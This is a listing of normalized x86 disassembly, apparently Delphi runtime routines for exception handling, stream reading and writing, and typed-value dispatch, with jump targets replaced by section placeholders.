mov eax [ ebp - 0x4 ]
call sub_41d80c
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_41d3a0
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41d80c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031b8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4177f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_41d65f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405fd8
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4183f4
xor eax eax
push ebp
push sub_41d63f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_4185ac
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d646
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403270
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_418550
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_41d690
call sub_402784
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403aa0
jmp r-xdata
call sub_403a4c
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_41b794
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d700
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41d6bf
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41b93c
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a4c
call sub_403aa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d700
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403270
sub_41d72c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d7d6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d7a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d9e8
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4145bc
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_41ba84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_41babc
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d7dd
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d80c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_41d80c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41bfac
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040d8
mov eax esi
call j_sub_4044b4
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41bfac
pop edx
pop esi
pop ebx
retn
sub_41d848
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d8f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bf88
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41d904
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404270
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d8fc
lea eax [ ebp - 0x8 ]
call sub_4046c8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d9e8
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41bfac
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404634
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41bfac
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41bfac
jmp r-xdata
jmp r-xdata
call sub_41ba84
sub_41d904
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41d9db
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41bf88
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d848
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404814
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d9e2
lea eax [ ebp - 0xc ]
call sub_403fe8
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_41d9e8
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41bfac
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404910
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_41bfac
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_41bfac
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404634
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_41bfac
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405c78
jmp r-xdata
jmp r-xdata
call sub_41ba84
sub_41d9fc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41da38
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d80c
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41da3f
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41da44
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bc44
test al al
je r-xdata
mov eax [ ebx ]
call sub_41daf8
mov eax [ ebx ]
call sub_41cbb0
pop ebx
pop ebp
retn
sub_41da6c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41bfac
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41def0
pop ebx
pop ecx
pop ebp
retn
sub_41da9c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_41bc44
test al al
je r-xdata
mov eax [ ebx ]
call sub_41bf88
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_41cbb0
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_41def0
jmp r-xdata
mov eax [ ebx ]
call sub_41daf8
mov eax [ ebx ]
call sub_41bc44
test al al
je r-xdata
mov eax [ ebx ]
call sub_41dc94
mov eax [ ebx ]
call sub_41cbb0
sub_41daf8
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41dc87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d9e8
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dc8e
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
jmp [ eax * 4 + jump_table_41db2f ]
push ebp
call sub_41da44
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d80c
jmp r-xdata
push ebp
mov eax 0x1
call sub_41da6c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9fc
jmp r-xdata
push ebp
mov eax 0x1
call sub_41da6c
pop ecx
jmp r-xdata
push ebp
call sub_41da9c
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
push ebp
mov eax 0x2
call sub_41da6c
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_41def0
jmp r-xdata
push ebp
mov eax 0x1
call sub_41da6c
pop ecx
sub_41dc94
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41dcd1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41d80c
mov eax ebx
call sub_41daf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dcd8
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41dcdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_41dd74
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_41bc44
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41d80c
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_41d80c
jmp r-xdata
mov eax ebx
call sub_41dc94
mov eax ebx
call sub_41cbb0
jmp r-xdata
mov eax ebx
call sub_41bc44
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_41dcdc
mov eax ebx
call sub_41cbb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dd7b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40400c
retn
sub_41dd84
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41de29
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404080
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_420d74
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41de30
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b760
call sub_403a24
sub_41de54
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_41de7c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_41bedc
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_4179e8
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403484
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_41bedc
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_41def0
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_41bfac
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_41bfac
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_41df38
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41e0e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_41bb10
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e0bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_41bfac
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_41a9ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_41bfac
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b3cc
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e097
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41d848
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_41bfac
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_41a9ec
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41bfac
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_414244
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
lea eax [ ebp - 0x1c ]
call sub_4058a8
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cfc4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e09e
mov eax [ ebp - 0xc ]
call sub_403270
retn
sub_41e100
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e2fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40ec78
mov eax [ ebp - 0x4 ]
call sub_41bf88
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
jmp [ eax * 4 + jump_table_41e142 ]
mov eax [ ebp - 0x4 ]
call sub_41d9e8
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41caf8
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_412e08
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41caf8
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_412e08
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41caf8
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_412e08
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c8dc
mov eax ebx
call sub_413000
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c920
mov eax ebx
call sub_413000
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c964
mov eax ebx
call sub_413028
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c9b4
mov eax ebx
call sub_413014
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41d848
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_41303c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41d904
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_413068
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d9e8
cmp al 0x9
sete dl
mov eax ebx
call sub_412fd8
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_41df38
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40efa0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cb64
push edx
push eax
mov eax ebx
call sub_412f04
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e301
lea eax [ ebp - 0x1c ]
call sub_40ec8c
lea eax [ ebp - 0xc ]
call sub_4046c8
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
mov eax ebx
call sub_41432c
jmp r-xdata
sub_41e308
push ebx
push esi
call sub_403624
mov ebx edx
mov esi eax
mov eax esi
call sub_41e4d4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41b414
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40360c
sub_41e340
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4203e4
mov edx ebx
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
sub_41e368
push ebp
mov ebp esp
push ebx
mov ebx eax
test cl cl
je r-xdata
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
call sub_4203e4
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_41e44c
sub_41e3ac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_41a968
cmp eax esi
jg r-xdata
mov eax ebx
call sub_41e4d4
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0x4 ]
call sub_41a988
pop esi
pop ebx
retn
mov edx [ ebx + 0x10 ]
add edx eax
cmp esi edx
jle r-xdata
sub esi eax
mov [ ebx + 0x10 ] esi
pop esi
pop ebx
retn
sub_41e400
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_41e4d4
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41e44c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403240
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e4c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov dl 0xa
mov eax ebx
call sub_420620
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax ebx
call sub_41e400
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax ebx
call sub_41e400
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e4ca
mov eax [ ebp - 0x4 ]
call sub_403270
retn
sub_41e500
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_41e543
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4041d0
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_420518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e54a
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_41e550
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x20 ] edx
xor eax eax
push ebp
push sub_41e5e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0xe
mov eax [ ebp - 0x4 ]
call sub_420620
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41edbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5e9
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
retn
mov eax edi
call sub_4192c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
call sub_41edb4
mov edx esi
mov eax edi
call sub_4192c8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ee08
mov eax [ ebp - 0x4 ]
call sub_41edbc
inc esi
dec ebx
jne r-xdata
sub_41e5f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor esi esi
inc ebx
xor edi edi
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx edi
call sub_418550
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_407ee0
test al al
jne r-xdata
sub_41e640
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e787
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
or [ eax + 0x1c ] 0x4
mov eax [ ebp - 0x8 ]
call sub_420e90
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
call sub_41e5f0
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420e64
or [ eax + 0x1c ] 0x4
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax [ ebp - 0x8 ]
and [ eax + 0x1c ] 0xfffb
mov eax [ ebp - 0x8 ]
call sub_420e90
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420e64
test [ eax + 0x24 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e78e
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x28 ] edx
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x28
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20 ] edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_420e64
and [ eax + 0x1c ] 0xfffb
mov edx ebx
mov eax [ ebp - 0x8 ]
